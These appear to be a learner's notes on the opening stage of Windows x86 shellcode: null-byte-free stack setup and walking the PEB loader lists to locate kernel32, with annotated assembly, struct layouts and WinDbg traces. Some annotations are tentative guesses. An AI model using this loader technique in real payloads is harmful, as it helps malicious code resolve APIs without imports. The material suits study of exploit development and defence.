

```asm
start:
    mov ebp, esp
    add esp, 0xfffff9f9
```

1. move address of stack pointer to the base pointer to start a stable anchor point for shellcode-local storage
"create a stable base address for shellcode runtime state"
2. 0xfffff9f9 or -0x607 (-1543) allocates 1543 bytes to the stack and avoids null bytes
Move the stack downward to reserve scratch space while avoiding NULL bytes in the opcode encoding.

## "Where is kernel32.dll loaded in memory?"

Because once shellcode finds:

* kernel32 base address

it can:

* parse exports
* locate APIs
* bootstrap everything else

```asm
find_kernel32:                      
    xor ecx,ecx                      
    mov esi,fs:[ecx+30h]            
    mov esi,[esi+0Ch]               
    mov esi,[esi+1Ch]               
```

```c
typedef struct _PEB_LDR_DATA {

    ULONG Length;                           // 0x00
    BOOLEAN Initialized;                    // 0x04
    PVOID SsHandle;                         // 0x08

    LIST_ENTRY InLoadOrderModuleList;       // 0x0C
    LIST_ENTRY InMemoryOrderModuleList;     // 0x14
    LIST_ENTRY InInitializationOrderList;   // 0x1C

} PEB_LDR_DATA;
```

InInitializationOrderList

```c
typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY* Flink;
    struct _LIST_ENTRY* Blink;
} LIST_ENTRY;
```

1. `xor ecx, ecx` or `31 c9` (opcodes): zero out register ecx
2. `mov esi, fs:[ecx+30h]`: TEB.ProcessEnvironmentBlock...loading the address of the PEB into esi
Gives shellcode access to loaded modules, process metadata, and loader structures without calling APIs.
3. `mov esi, [esi+0Ch]`: address of PEB_LDR_DATA Ldr contains linked list of loaded modules
4. `mov esi,[esi+1Ch]`: LIST_ENTRY InInitializationOrderModuleList: list of modules in the order they were initialized for the current process. At this point `ESI = first LIST_ENTRY node`. 

`mov esi,[esi+1Ch]` dereferences the LIST_ENTRY (ESI = FLINK)

```txt
0:003> r
eax=d07a57fe ebx=00000000 ecx=00000000 edx=02a10000 esi=02a10000 edi=02a10000
eip=02a1000a esp=02dff5dd ebp=02dffbe4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02a1000a 648b7130        mov     esi,dword ptr fs:[ecx+30h] fs:003b:00000030=00735000
0:003> dg fs
                                  P Si Gr Pr Lo
Sel    Base     Limit     Type    l ze an es ng Flags
---- -------- -------- ---------- - -- -- -- -- --------
003B 0073a000 00000fff Data RW Ac 3 Bg By P  Nl 000004f3
0:003> dd fs:[30] L1
003b:00000030  00735000
0:003> t
eax=d07a57fe ebx=00000000 ecx=00000000 edx=02a10000 esi=00735000 edi=02a10000
eip=02a1000e esp=02dff5dd ebp=02dffbe4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02a1000e 8b760c          mov     esi,dword ptr [esi+0Ch] ds:0023:0073500c={ntdll!PebLdr (7753ab40)}
0:003> r esi
esi=00735000
0:003> dt _PEB 00735000
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Mutant           : 0xffffffff Void
   +0x008 ImageBaseAddress : 0x001f0000 Void
   +0x00c Ldr              : 0x7753ab40 _PEB_LDR_DATA
   +0x010 ProcessParameters : 0x004e16d8 _RTL_USER_PROCESS_PARAMETERS
   +0x014 SubSystemData    : (null) 
   +0x018 ProcessHeap      : 0x004e0000 Void
   +0x01c FastPebLock      : 0x7753a940 _RTL_CRITICAL_SECTION
   +0x020 AtlThunkSListPtr : (null) 
   +0x024 IFEOKey          : (null) 
   +0x028 CrossProcessFlags : 1
   +0x028 ProcessInJob     : 0y1
   +0x028 ProcessInitializing : 0y0
   +0x028 ProcessUsingVEH  : 0y0
   +0x028 ProcessUsingVCH  : 0y0
   +0x028 ProcessUsingFTH  : 0y0
   +0x028 ProcessPreviouslyThrottled : 0y0
   +0x028 ProcessCurrentlyThrottled : 0y0
   +0x028 ReservedBits0    : 0y0000000000000000000000000 (0)
   +0x02c KernelCallbackTable : 0x764510e8 Void
   +0x02c UserSharedInfoPtr : 0x764510e8 Void
   +0x030 SystemReserved   : 0
   +0x034 AtlThunkSListPtr32 : (null) 
   +0x038 ApiSetMap        : 0x00430000 Void
   +0x03c TlsExpansionCounter : 0
   +0x040 TlsBitmap        : 0x7753ab98 Void
   +0x044 TlsBitmapBits    : [2] 0x1003f
   +0x04c ReadOnlySharedMemoryBase : 0x7f490000 Void
   +0x050 SharedData       : (null) 
   +0x054 ReadOnlyStaticServerData : 0x7f4904a0  -> (null) 
   +0x058 AnsiCodePageData : 0x7f590000 Void
   +0x05c OemCodePageData  : 0x7f5a0224 Void
   +0x060 UnicodeCaseTableData : 0x7f5b0648 Void
   +0x064 NumberOfProcessors : 2
   +0x068 NtGlobalFlag     : 0
   +0x070 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000
   +0x078 HeapSegmentReserve : 0x100000
   +0x07c HeapSegmentCommit : 0x2000
   +0x080 HeapDeCommitTotalFreeThreshold : 0x10000
   +0x084 HeapDeCommitFreeBlockThreshold : 0x1000
   +0x088 NumberOfHeaps    : 3
   +0x08c MaximumNumberOfHeaps : 0x10
   +0x090 ProcessHeaps     : 0x77539660  -> 0x004e0000 Void
   +0x094 GdiSharedHandleTable : 0x01020000 Void
   +0x098 ProcessStarterHelper : (null) 
   +0x09c GdiDCAttributeList : 0x14
   +0x0a0 LoaderLock       : 0x775383c0 _RTL_CRITICAL_SECTION
   +0x0a4 OSMajorVersion   : 0xa
   +0x0a8 OSMinorVersion   : 0
   +0x0ac OSBuildNumber    : 0x3fab
   +0x0ae OSCSDVersion     : 0
   +0x0b0 OSPlatformId     : 2
   +0x0b4 ImageSubsystem   : 3
   +0x0b8 ImageSubsystemMajorVersion : 6
   +0x0bc ImageSubsystemMinorVersion : 0
   +0x0c0 ActiveProcessAffinityMask : 3
   +0x0c4 GdiHandleBuffer  : [34] 0
   +0x14c PostProcessInitRoutine : (null) 
   +0x150 TlsExpansionBitmap : 0x7753ab88 Void
   +0x154 TlsExpansionBitmapBits : [32] 1
   +0x1d4 SessionId        : 2
   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER 0x0
   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0
   +0x1e8 pShimData        : 0x00470000 Void
   +0x1ec AppCompatInfo    : (null) 
   +0x1f0 CSDVersion       : _UNICODE_STRING ""
   +0x1f8 ActivationContextData : 0x00460000 _ACTIVATION_CONTEXT_DATA
   +0x1fc ProcessAssemblyStorageMap : (null) 
   +0x200 SystemDefaultActivationContextData : 0x00450000 _ACTIVATION_CONTEXT_DATA
   +0x204 SystemAssemblyStorageMap : (null) 
   +0x208 MinimumStackCommit : 0
   +0x20c FlsCallback      : 0x004eac00 _FLS_CALLBACK_INFO
   +0x210 FlsListHead      : _LIST_ENTRY [ 0x4ea9f0 - 0x581200 ]
   +0x218 FlsBitmap        : 0x7753abc0 Void
   +0x21c FlsBitmapBits    : [4] 0x7f
   +0x22c FlsHighIndex     : 6
   +0x230 WerRegistrationData : (null) 
   +0x234 WerShipAssertPtr : (null) 
   +0x238 pUnused          : (null) 
   +0x23c pImageHeaderHash : (null) 
   +0x240 TracingFlags     : 0
   +0x240 HeapTracingEnabled : 0y0
   +0x240 CritSecTracingEnabled : 0y0
   +0x240 LibLoaderTracingEnabled : 0y0
   +0x240 SpareTracingBits : 0y00000000000000000000000000000 (0)
   +0x248 CsrServerReadOnlySharedMemoryBase : 0x7f3d0000
   +0x250 TppWorkerpListLock : 0
   +0x254 TppWorkerpList   : _LIST_ENTRY [ 0xcafdec - 0xe9f8b4 ]
   +0x25c WaitOnAddressHashTable : [128] (null) 
   +0x45c TelemetryCoverageHeader : (null) 
   +0x460 CloudFileFlags   : 0
0:003> t
eax=d07a57fe ebx=00000000 ecx=00000000 edx=02a10000 esi=7753ab40 edi=02a10000
eip=02a10011 esp=02dff5dd ebp=02dffbe4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02a10011 8b761c          mov     esi,dword ptr [esi+1Ch] ds:0023:7753ab5c=004e1de8
0:003> dd esi+0c L1
7753ab4c  004e1ec0  


```



```asm
next_module:                        
    mov ebx, [esi+8h]                
    mov edi, [esi+20h]               
    mov esi, [esi]                   
    cmp [edi+12*2], cx               
    jne next_module                  
```

```c
typedef struct _LDR_DATA_TABLE_ENTRY {

    LIST_ENTRY InLoadOrderLinks;          // 0x00
    LIST_ENTRY InMemoryOrderLinks;        // 0x08
    LIST_ENTRY InInitializationOrderLinks;// 0x10

    PVOID DllBase;                        // 0x18
    ...
    UNICODE_STRING FullDllName;           // 0x24
    UNICODE_STRING BaseDllName;           // 0x2C

} LDR_DATA_TABLE_ENTRY;
```

1. `mov ebx, [esi+8h]`: `ESI = &InInitializationOrderLinks` inside LDR_DATA_TABLE_ENTRY
    esi starts at 0x10
2. `mov edi, [esi+20h]`: LDR_TABLE_ENTRY _LIST_ENTRY for next module
3. `mov esi, [esi]`: Value of esi to address of esi?
4. `cmp [edi+12*2], cx`: Compare the 16-bit cx register to full name?, but 12*2 is 24 and there is no 24 byte offset
5. `jne next_module`: loop if cmp fails

```txt
0:003> t
eax=d07a57fe ebx=00000000 ecx=00000000 edx=02a10000 esi=004e1de8 edi=02a10000
eip=02a10014 esp=02dff5dd ebp=02dffbe4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02a10014 8b5e08          mov     ebx,dword ptr [esi+8] ds:0023:004e1df0={ntdll!RtlpSlashSlashDot <PERF> (ntdll+0x0) (77420000)}
0:003> dd esi+0c L1
004e1df4  00000000
0:003> t
eax=d07a57fe ebx=77420000 ecx=00000000 edx=02a10000 esi=004e1de8 edi=02a10000
eip=02a10017 esp=02dff5dd ebp=02dffbe4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02a10017 8b7e20          mov     edi,dword ptr [esi+20h] ds:0023:004e1e08={ntdll!`string' (774279e0)}
0:003> r esi
esi=004e1de8
0:003> dd esi-20 L20
004e1dc8  0000003b 00000000 ddf3d35d 0800ba94
004e1dd8  004e2260 004e1ec0 004e2268 004e1ec8
004e1de8  004e25c0 7753ab5c 77420000 00000000
004e1df8  00190000 003c003a 004e1ce8 00140012
004e1e08  774279e0 0000a2c4 0000ffff 7753aa40
004e1e18  7753aa40 1d27c592 00000000 00000000
004e1e28  004e1e88 004e1e88 004e1e88 00000000
004e1e38  00000000 00000000 00000000 00000000
0:003> dt _PEB_LDR_DATA 7753ab40
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x30
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4e1ec0 - 0x4e9090 ]
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4e1ec8 - 0x4e9098 ]
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4e1de8 - 0x4e9830 ]
   +0x024 EntryInProgress  : (null) 
   +0x028 ShutdownInProgress : 0 ''
   +0x02c ShutdownThreadId : (null) 

ESI       -> Flink/Blink of embedded LIST_ENTRY
ESI+8     -> module DllBase
ESI+20    -> pointer to BaseDllName buffer

0:003> dd esi L2
004e1de8  004e25c0 7753ab5c
0:003> dd esi+8 L1
004e1df0  77420000
0:003> dd esi+20 L1
004e1e08  774279e0
0:003> du poi(esi+20)
774279e0  "ntdll.dll"


```

